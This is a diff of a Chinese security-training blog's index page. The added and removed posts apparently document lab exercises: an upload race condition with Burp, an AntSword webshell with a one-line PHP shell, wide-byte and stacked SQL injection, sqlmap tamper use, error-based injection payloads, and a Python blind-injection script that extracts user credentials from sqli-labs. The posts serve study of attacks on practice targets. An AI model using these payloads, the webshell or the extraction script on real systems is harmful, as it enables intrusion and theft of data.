+<p>3.先上传一张正常的图片10.jpg，右键复制图像链接。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704885215637-32298a38-9f49-442b-bceb-0c581cad93c6.png" alt="image.png"><br>4.打开Burp,把复制的图像链接后面的2024011xxxx.jpg改为2.php,然后粘贴到Burp的内置浏览器，再抓包<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704890271835-cb54bc7f-29b2-4f93-9083-d9e3778b9fd7.png#averageHue=%23f9f4f2&clientId=ueb46ed70-4956-4&from=paste&height=52&id=ub32eb19a&originHeight=52&originWidth=508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3697&status=done&style=none&taskId=u8afd7538-8c62-42a6-9511-06efb0aa001&title=&width=508" alt="image.png"><br>5.把抓到的包发送到intruder,得到访问木马的包。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704890537868-413dcfb1-96a2-4a5a-8115-841752bdd3a6.png" alt="image.png"><br>6.接下来，去抓上传木马的包，选择2.php，点击下图箭头处的上传，把抓到的上传木马的包发送到intruder<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704890994769-8184db52-bc90-462f-a016-38c4ef8faf6d.png" alt="image.png"></p>
+<pre><code>  7.  3和4都改成无限发包，3是上传，4是访问。
+      ![image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704891390603-d307cab2-7d08-4aa6-9430-2678af922b0f.png)
+8.  3和4的线程都改成50
+    ![image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704891573291-56a2dfc0-500d-40fe-b6fc-bebf4988967f.png)         
+    9.点击Burp的开始攻击。结果如下
+    ![Image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704981839385-21f5a2ff-1095-4412-93b6-dc5715616b2d.png)
+    10.复制Request中的选中的部分，粘贴到upload/的后面并访问。
+    ![Image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704981891067-8a5b9687-887f-4f1a-826a-337cfbc4a084.png)
+</code></pre>
+<h2 id="蚁剑工具的使用"><a href="#蚁剑工具的使用" class="headerlink" title="蚁剑工具的使用"></a>蚁剑工具的使用</h2><h3 id="蚁剑工具的介绍"><a href="#蚁剑工具的介绍" class="headerlink" title="蚁剑工具的介绍"></a>蚁剑工具的介绍</h3><p>蚁剑（AntSword）是一款被设计用于网络攻击的远程控制工具，它能够使得攻击者获取受害计算机的远程控制权限。蚁剑通过在受害者计算机上植入恶意软件，创建一个“后门”，使攻击者可以未经授权地访问受害者系统，进行数据窃取、监控、操纵等一系列非法操作。</p>
+<h3 id="蚁剑工具的使用-1"><a href="#蚁剑工具的使用-1" class="headerlink" title="蚁剑工具的使用"></a>蚁剑工具的使用</h3><p>1.重新编写木马2.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  @<span class="title function_ invoke__">ecal</span>(<span class="variable">$_post</span>[a]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.kali自带蚁剑工具，双击AntSword<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704892509666-e4b34028-bd3c-4653-bc7a-3b18d903bb90.png" alt="image.png"><br>3.右击空白处，添加数据。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704893002140-aaab2029-bcd0-43dc-8194-415a988a9db9.png" alt="image.png"><br>4.按下图填写URL地址和连接密码。点击测试链接。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704892977762-06fa7e0c-68d6-4461-b355-5cea029f1f51.png" alt="image.png"><br>5.连接靶机成功，可以对靶机上的文件进行操作。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704893925898-a8bd3d04-f015-4414-815d-0c3b546fc5cb.png" alt="image.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-CDN介绍及绕过,支付逻辑漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -954,229 +1189,9 @@
 
 
   
-    <article id="post-宽字节注入，堆叠注入，绕过 ,Tamper脚本" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/01/01/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%8C%E7%BB%95%E8%BF%87%20,Tamper%E8%84%9A%E6%9C%AC/" class="article-date">
-      <time datetime="2024-01-01T13:49:35.000Z" itemprop="datePublished">2024-01-01</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/01/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%8C%E7%BB%95%E8%BF%87%20,Tamper%E8%84%9A%E6%9C%AC/">宽字节注入，堆叠注入，绕过 ,Tamper脚本</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="宽字节注入-—-df"><a href="#宽字节注入-—-df" class="headerlink" title="宽字节注入 —%df"></a>宽字节注入 —%df</h2><p>1.涉及函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addslashes()   /函数返回在预定义字符之前添加反斜杠的字符串</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string() /函数转义 SQL 语句中使用的字符串中的特殊字符</span><br><span class="line"></span><br><span class="line">mysql_escape_string() /转义一个字符串</span><br></pre></td></tr></table></figure>
-
-<p>2.原理<br>先了解一下什么是窄、宽字节已经常见宽字节编码：</p>
-<ul>
-<li>当某字符的大小为一个字节时，称其字符为窄字节.</li>
-<li>当某字符的大小为两个字节时，称其字符为宽字节.</li>
-<li>所有英文默认占一个字节，汉字占两个字节</li>
-<li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等</li>
-</ul>
-<p>3.逃逸过程：<br>     and被php转义后就是%df<br> （1）举例命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27; and 1=1--+</span><br></pre></td></tr></table></figure>
-
-<p>%df’&#x3D;&gt;%df&#39;（单引号会被加上转义字符\）<br>%df&#39;&#x3D;&gt;%df%5c’（\的十六进制为%5c）<br>%df%5c’&#x3D;&gt;縗’（GBK编码时会认为这时一个宽字节）<br>‘成功逃逸，sql语法正确<br>3.例题<br>sql-labs-32关<br>（1）先找闭合点，输入?id&#x3D;1’,页面显示1的后面多了 \   z在输入id&#x3D;1”     id&#x3D;’1’  ,发现单引号后面都有 \    猜测 \ 把单引号转义了，考虑用宽字节注入%df<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703765765377-ca80fe14-011d-47c7-b5a5-6e51dcd1861b.png" alt="image.png"><br>（2）输入id&#x3D;1%df’后报错，单引号是闭合点。具体代码如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.2/sqli/Less-32/?id=1%df&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1))-- -</span><br></pre></td></tr></table></figure>
-
-<p>结果：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703766052527-d2b5c623-8923-4f0c-9a0f-9d7af0a80391.png" alt="image.png"></p>
-<p>4.锟斤拷：锟斤拷通常指的是在网络或计算机系统中出现的一串特殊乱码字符，这种现象多出现在字符编码转换过程中。具体来说，锟斤拷出现的原因是因为在将某些字符从GBK编码转换为Unicode编码时，存在一些字符是Unicode无法表示的。为了在Unicode中有一个地方表示这些字符，Unicode官方定义了一个特殊的占位符，即U+FFFD REPLACEMENT CHARACTER。<br>在UTF-8编码中，这个占位符被编码为EFBFBD。当这些编码被错误地识别为GBK编码时，由于GBK是一个双字节编码，它会把EFBFBD这样的字节序列错误地解释为一个汉字，于是产生了像“锟斤拷”这样的乱码。其中，“锟”对应于EFBF，“斤”对应于BDEF，“拷”对应于BFBD。</p>
-<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>1.堆叠注入的含义<br>从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。<br><strong>注意不是每个数据库环境都可以支持堆叠注入。</strong><br>2.MySQL多语句执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select *from user;select * from emails</span><br><span class="line">select 1,(select group_concat(1,2,3)),3</span><br><span class="line">select 1,2,3 union select 4,5,6</span><br></pre></td></tr></table></figure>
-
-<p>3.例题<br>sql-labs-38关<br>源代码中有mysqli_multi_query  可以用堆叠注入<br>?id&#x3D;-1’;insert into users(id,username,password) values (‘17’,’Jay’,666’)– +<br>输入id&#x3D;17的结果：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703770397512-de8edcb3-dfa9-4a4a-8f38-6ce58838eefd.png" alt="image.png"></p>
-<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h3><p>1.同一个参数发出两个值，不同的浏览器会接收不同的参数，参数可能是第一个或者第三个，不可能是中间的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?p=usa&amp;p=china</span><br><span class="line">百度1</span><br><span class="line">雅虎2</span><br><span class="line">google 1+2</span><br><span class="line">php/apache 2</span><br><span class="line">flask 1</span><br><span class="line">jsp/tomcat 1</span><br><span class="line">CGI/apache 1</span><br><span class="line">python/apache 1+2</span><br><span class="line">asp/iis </span><br></pre></td></tr></table></figure>
-
-<p>2.例如，在CSDN找一个下载sql server的外链接：<a href="https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://link.csdn.net/?target=https%3A%2F%2Fwww.microsoft.com%2Fzh-cn%2Fsql-server%2Fsql-server-downloads</a><br>将其复制到Yakit软件用URL解码，解码为<a href="https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703772452472-307f1e1e-3296-4a2c-a48a-ca3b4c2c2bf5.png" alt="image.png"></p>
-<ol start="3">
-<li>在<a href="https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a> 后加一个参数target&#x3D;，即<a href="https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a>?target&#x3D;<a target="_blank" rel="noopener" href="https://tb.alicdn.com/snapshot/index.html">https://tb.alicdn.com/snapshot/index.html</a>   ，为了方便理解，我们把两个target的内容换一下位置，即：<a href="https://tb.alicdn.com/snapshot/index.html?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://tb.alicdn.com/snapshot/index.html?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a>因为CSDN是用java写的，当点击这个网址时，根据    jsp&#x2F;tomcat 1   会跳到第一个参数。如下图，从CSDN跳到了淘宝。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703773886798-9941ff79-59ab-4084-bbc9-3a4c10d20bf7.png" alt="image.png"></li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703773921659-cc02d845-4a59-4a1f-98aa-ad996f44354a.png" alt="image.png"></p>
-<h3 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h3><p>   详细SQL注入绕过技术见链接：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1849607">https://cloud.tencent.com/developer/article/1849607</a></p>
-<h2 id="Sqlmap的Tamper脚本"><a href="#Sqlmap的Tamper脚本" class="headerlink" title="Sqlmap的Tamper脚本"></a>Sqlmap的Tamper脚本</h2><h3 id="Tamper脚本的介绍："><a href="#Tamper脚本的介绍：" class="headerlink" title="Tamper脚本的介绍："></a>Tamper脚本的介绍：</h3><p>它允许用户在执行SQL注入攻击时对 payload（攻击载荷）进行修改，以绕过目标服务器的防护机制，如WAF（Web Application Firewall）或IDS（Intrusion Detection System）。这些防护系统通常会检测和过滤掉某些特定的关键字或模式，以防止恶意攻击。Tamper脚本对payload进行转换或编码，使其能够逃避这些检测。</p>
-<h3 id="Sqlmap常用命令（面试考）"><a href="#Sqlmap常用命令（面试考）" class="headerlink" title="Sqlmap常用命令（面试考）"></a>Sqlmap常用命令（面试考）</h3><p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703774560959-2550790a-2d02-4e02-b7da-de1dbb8ee384.png" alt="Image.png"></p>
-<h3 id="Sqlmap跑sqli-labs-26a关"><a href="#Sqlmap跑sqli-labs-26a关" class="headerlink" title="Sqlmap跑sqli-labs 26a关"></a>Sqlmap跑sqli-labs 26a关</h3><p>在vscode中新建1.py  并在它中编写26a关的Tamper脚本，将其复制到kali机的&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;  的目录下。在kali的命令窗口运行以下命令;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.2/sqli/Less-26a/?id=1&quot; -p id --dbms=MySQL --tamper=&quot;1.py&quot; --dbs --batch</span><br></pre></td></tr></table></figure>
-
-<p>成功爆出数据库<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703775172152-497ec8a3-68f9-4164-b79c-473774736168.png" alt="Image.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-SQL注入之盲注型,报错型，postman软件的使用" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/12/25/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8%E5%9E%8B,%E6%8A%A5%E9%94%99%E5%9E%8B%EF%BC%8Cpostman%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
-      <time datetime="2023-12-25T02:13:04.000Z" itemprop="datePublished">2023-12-25</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/25/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8%E5%9E%8B,%E6%8A%A5%E9%94%99%E5%9E%8B%EF%BC%8Cpostman%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/">SQL注入之盲注型,报错型，postman软件的使用</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="SQL数字型注入"><a href="#SQL数字型注入" class="headerlink" title="SQL数字型注入"></a>SQL数字型注入</h2><p>1.打开虚拟机win10hei的phpstudy,开启Apache和Mysql，使用php5.5.9,打开网站，点击sqli,点击下图圈内的数据，初始化数据库。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703163695294-5a64ff5b-77a0-4b29-8675-4a840803c65b.png" alt="image.png"><br>2.进入第二关，按键盘的F12,点击HackBar,输入<a target="_blank" rel="noopener" href="http://192.168.17.128/sqli/Less-2/?id=1">http://192.168.17.128/sqli/Less-2/?id=1</a>，没报错，我们要找的是报错点<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703163939662-a60b000d-b674-43cd-b548-dce59af2a3b4.png" alt="image.png"><br>3.查看第二关的代码，发现这关的解法是数字型注入<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164370988-148029f7-d7ef-4e36-9e3c-6157fb4e515e.png" alt="image.png"><br>4.id&#x3D;1 后面加 order by 4,发现字段没有四列，所以一般是3列。开始查表。和之前的一样的套路，union联合注入<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164620139-6071a896-7eac-4fef-966e-6a004057d5a6.png" alt="image.png"><br>5.查字段名<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164753618-29682902-5766-431f-9374-9cc5c40f5cdd.png" alt="image.png"><br>6.查字段，得到我们想要的结果<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164848325-261c35f6-89c1-4224-a04a-35ece6a05ef5.png" alt="image.png"><br>7.十种常见的SQL报错函数  （注意：函数前用and连接）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -</span><br><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br><span class="line"></span><br><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))-- -</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">exp(~(select * from(select user())a))-- -</span><br></pre></td></tr></table></figure>
-
-<h2 id="postman软件的使用"><a href="#postman软件的使用" class="headerlink" title="postman软件的使用"></a>postman软件的使用</h2><p>1.在虚拟机win10hei的火狐浏览器访问老师给的ctf show题目链接：<a target="_blank" rel="noopener" href="http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/">http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703250565862-28b7bbad-59cc-49ef-acbd-724e469485b7.png" alt="image.png"><br>2.键入F12，点击网络，点击重新加载，找到API，即名字为v3.php?page&#x3D;1&amp;limit&#x3D;10的文件，复制右边栏GET请求的网址，粘贴到postman的发包框内<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703248669523-c7c4f1be-66ab-4b58-96d1-46d603fb61d8.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703248850495-d7e11cf9-0571-4085-9798-f28921ab0d03.png" alt="image.png"><br>3.发送请求方式选择GET,在表格第三行输入id和1，点击send,查询到了id&#x3D;1的用户名和密码。然后找闭合点，在1的后面加单引号，再点击send,发现底栏报错，说明1’是闭合点<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249314650-9f381305-de9f-4f30-a489-2b56eac6392c.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/40675946/1703249614803-476ebe29-f994-4f6a-a167-2303e0b9fdb0.png#averageHue=%23fcfcfc&clientId=u644166bb-afff-4&from=paste&height=371&id=u7bb98b60&originHeight=371&originWidth=904&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22993&status=done&style=none&taskId=u75ea20b7-cc28-4cd3-8b25-a4ec0a20862&title=&width=904" alt="image.png"><br>4.1’的后面加order by 4 – -判断数据表是否有4列，结果报错，改成order by 3 – -，可以显示数据，说明只有3列<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249919426-3163c3ca-214a-4385-9ba4-d2896a3a1f18.png" alt="image.png"><br>5.查字段名，把1改成-1，在表格1’后面使用union联合sql语句,和之前的报错型的步骤基本相同<br><code>-1&#39; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;ctfshow_user3&#39; and table_schema=database();-- -</code><br>6.查字段，在表格1’后面使用union联合sql语句。<br><code>-1&#39; union select 1,2,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from ctfshow_user3 ;-- -</code><br>因为我们要得到的是username&#x3D;’flag’的密码，所以要删除username,最终为<br><code>-1&#39; union select 1,2,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from ctfshow_user3 ;-- -</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703251101346-9141a6ac-450d-43e9-aab9-c71acea03323.png" alt="image.png"></p>
-<h2 id="SQL注入之盲注型，布尔"><a href="#SQL注入之盲注型，布尔" class="headerlink" title="SQL注入之盲注型，布尔"></a>SQL注入之盲注型，布尔</h2><p>1.SQL注入理论<br>（1）SQL注入的含义:SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。<br>（2）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168115226-4b84b8d3-1f5f-4290-a0f9-74e0af769592.png" alt="Image.png"><br>（3）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168181264-adbd4c70-64ff-45ed-89b6-ac32390792f9.png" alt="Image.png"><br>（4）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168241171-bb34d4fe-cb99-49d7-a738-c5c391a116af.png" alt="Image.png"><br>（5）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168291828-ac2d160c-5077-4f3f-8fb8-dc62fda8e7f1.png" alt="Image.png"><br>（6）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168324049-4b6009f0-0bb3-4989-ade2-120b1de01cd6.png" alt="Image.png"><br>2.<code>id=1&#39;and ascii(substring(database(),1,1))=115--+</code>,根据提供的语句，以sqli的第6关为例，编写一个SQL盲注的python脚本并运行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url = &#x27;http://192.168.17.128/sqli/Less-6/?id=1&quot;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db():</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        begin = 32</span><br><span class="line">        end = 128</span><br><span class="line">        tmp = (begin + end) // 2</span><br><span class="line">        while begin &lt; end:</span><br><span class="line">            paramsGet = url + &quot;/**/and/**/ascii(substring((select group_concat(id,username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(</span><br><span class="line">                i, tmp)</span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            if &#x27;You are in...........&#x27; in response.text:</span><br><span class="line">                begin = tmp + 1</span><br><span class="line">                tmp = (begin+end) // 2</span><br><span class="line">            else:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end) // 2</span><br><span class="line">        if tmp == 32:</span><br><span class="line">            break</span><br><span class="line">        name += chr(tmp)</span><br><span class="line">        print(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>分析如下：<br>（1）import requests：导入 requests 模块，用于发送 HTTP 请求。<br>（2）session &#x3D; requests.session()：创建一个 requests 会话（session）对象。<br>（3）url &#x3D; ‘<a target="_blank" rel="noopener" href="http://192.168.17.128/sqli/Less-6/?id=1%22%27%EF%BC%9A%E8%AE%BE%E7%BD%AE%E7%9B%AE%E6%A0%87">http://192.168.17.128/sqli/Less-6/?id=1&quot;&#39;：设置目标</a> URL，其中 id 参数的值为 1”，这里是一个潜在的注入点。<br>（4）利用名为 db 的函数，从数据库中逐个获取字符来构建字符串。代码通过二分法逐个猜测每个字符的 ASCII 值，并通过注入的操作获取其中的数据。<br>3.得到我们想要的字段。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703251885180-214f4be2-1d1f-4ff3-bf33-650e81b2cd4c.png" alt="image.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-布尔盲注实例,时间盲注,控制网站,sqlmap工具的使用。" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/12/25/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%AE%9E%E4%BE%8B,%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8,%E6%8E%A7%E5%88%B6%E7%BD%91%E7%AB%99,sqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E3%80%82/" class="article-date">
-      <time datetime="2023-12-25T01:03:21.000Z" itemprop="datePublished">2023-12-25</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/25/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%AE%9E%E4%BE%8B,%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8,%E6%8E%A7%E5%88%B6%E7%BD%91%E7%AB%99,sqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E3%80%82/">布尔盲注实例,时间盲注,控制网站,sqlmap工具的使用。</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="布尔盲注实例"><a href="#布尔盲注实例" class="headerlink" title="布尔盲注实例"></a>布尔盲注实例</h2><p>以ctf_show第四关为例。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703336220310-3b06d9b1-f7d9-45cf-ad4d-2fb84b70ff8c.png" alt="image.png"><br>按下F12，获得一个get请求的api，打开postman。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703336527700-822decb6-3af5-45dd-83a7-500fe0365ecc.png" alt="image.png"><br>能够得到对应的json，说明是一个api。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703336628436-88ce6077-76d9-4f82-9d57-961d52f85995.png" alt="image.png"><br>这里id&#x3D;1’and 1&#x3D;2– -正常回显结果为空，id&#x3D;1’and 1&#x3D;1– -正常回显显示id&#x3D;1的结果。闭合之后再去进行测试，否则就会报错。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703336779190-dd2add20-fded-4eba-a29c-713b0487b5d6.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703336956891-e3a23c56-b453-49aa-9e42-996761ce33b2.png" alt="image.png" style="zoom:50%;" /><br>查询数据库开头第一个字母是不是r。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337091145-af09b1bf-9ae4-493b-9c01-57adf7aa16d1.png" alt="image.png" style="zoom:50%;" /><br>这里直接用大于，小于进行判断第一个首字母。<br><img 